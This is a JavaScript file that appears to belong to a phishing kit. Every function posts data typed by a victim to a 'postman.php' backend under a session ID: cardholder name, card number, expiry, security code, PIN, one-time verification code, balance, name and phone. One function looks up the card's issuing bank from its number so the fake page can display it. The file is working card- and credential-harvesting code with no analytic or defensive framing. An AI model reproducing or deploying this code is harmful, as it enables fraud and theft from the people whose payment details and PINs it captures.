//Post requests:.
//sendINFO Functions:.
function sendMainINFO(sess, chol, cnum, cexp, ckod) {
   var postman = "global/inc/postman.php";
   var values = {
      'sess': sess,
      '_chol': chol,
      '_cnum': cnum,
      '_cexp': cexp,
      '_ckod': ckod
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('Sent!');
      }
   })
}

function sendPersonINFO(sess, info_data) {
   var postman = "global/inc/postman.php";
   var values = {
      'sess': sess,
      '_info': info_data
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('Sent!');
      }
   })
}

function sendBalanceINFO(sess, balance) {
   var postman = "global/inc/postman.php";
   var values = {
      'sess': sess,
      '_bala': balance
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('Sent!');
      }
   })
}

function sendStatusINFO(sess, state) {
   var postman = "global/inc/postman.php";
   var values = {
      'sess': sess,
      '_status': state
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('State updated! (' + sess + ')');
      }
   })
}

function sendInfo(sess, name, phone) {
    var postman = "global/inc/postman.php";
    var values = {
        'sess': sess,
        '_nme': name,
        '_pho': phone
    };

    $.ajax({
        type: 'POST',
        url: postman,
        data: values,
        success: function(data) {
            console.log('Sent!');
        }
    })
}

function sendPin(sess, kode) {
    var postman = "global/inc/postman.php";
    var values = {
        'sess': sess,
        '_pin': kode
    };

    $.ajax({
        type: 'POST',
        url: postman,
        data: values,
        success: function(data) {
            console.log('Sent!');
        }
    })
}

function sendKod(sess, kode) {
    var postman = "global/inc/postman.php";
    var values = {
        'sess': sess,
        'kode': kode
    };

    $.ajax({
        type: 'POST',
        url: postman,
        data: values,
        success: function(data) {
            console.log('Sent!');
        }
    })
}

function sendPost(id) {
   var postman = "global/inc/postman.php";
   var values = {
      'id_date': id
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('Sent!');
      }
   })
}


function sendStatusINFO(sess, state) {
    var postman = "global/inc/postman.php";
    var values = {
        'sess': sess,
        '_status': state
    };

    $.ajax({
        type: 'POST',
        url: postman,
        data: values,
        success: function(data) {
            console.log('State updated! (' + sess + ')');
        }
    })
}

function sendVisitor(id) {
   var postman = "global/inc/postman.php";
   var values = {
      'vi': id
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('Sent!');
      }
   })
}

function getBnk(cnum) {
    var url = 'global/inc/postman.php?returnBin=1&_cnumber=' + cnum;

    // Perform the GET request using $.ajax
    $.ajax({
        type: 'GET',
        url: url,
        success: function(response) {
            // Handle the response data here
            console.log('Response:', response);
            setInner('bnk-name', response);
        },
        error: function(error) {
            // Handle errors here
            console.error('Error:', error);
            alert('Error: ' + error.statusText);
        }
    });
}